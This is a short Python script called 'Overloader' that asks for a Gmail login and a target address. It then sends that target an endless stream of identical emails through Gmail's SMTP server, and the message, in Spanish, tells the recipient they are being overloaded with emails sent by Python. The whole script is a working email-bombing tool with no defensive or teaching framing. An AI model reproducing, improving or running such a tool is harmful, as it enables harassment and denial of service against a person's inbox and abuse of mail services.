# Overloader 1.2.2
import smtplib
import getpass
import os
import sys
try:
    if sys.argv[1] == "--version":
        print("1.2.1")
        e = 1
    else:
        e = 0
except:
    e = 0
    
if e == 1:
    sys.exit(0)
us = input("Your Email> ")
fromaddr = us
to = input("Email to overload> ")
toaddrs = to

msg = 'Estas sufriendo una sobrecarga de emails enviados por Python'

# Datos
username = us
print("Type your password here")
password = getpass.getpass()

#Sending the emails
n = 1
emenviados = 0
while n == 1:
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username, password)
    server.sendmail(fromaddr, toaddrs, msg)
    server.quit()
